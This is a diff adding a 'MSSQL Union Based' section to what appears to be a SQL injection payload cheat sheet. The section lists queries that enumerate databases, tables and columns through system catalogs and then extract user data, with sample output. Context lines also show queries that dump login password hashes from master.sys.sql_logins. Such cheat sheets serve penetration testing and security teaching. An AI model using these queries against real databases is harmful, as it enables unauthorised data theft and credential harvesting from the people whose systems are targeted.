@@ -57,6 +57,30 @@ SELECT name, password_hash FROM master.sys.sql_logins
 SELECT name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
 ```
 
+## MSSQL Union Based
+
+```sql
+-- extract databases names
+$ SELECT name FROM master..sysdatabases
+[*] Injection
+[*] msdb
+[*] tempdb
+
+-- extract tables from Injection database
+$ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
+[*] Profiles
+[*] Roles
+[*] Users
+
+-- extract columns for the table Users
+$ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')
+[*] UserId
+[*] UserName
+
+-- Finally extract the data
+$ SELECT  UserId, UserName from Users
+```
+
 ## MSSQL Error based
 
 ```sql
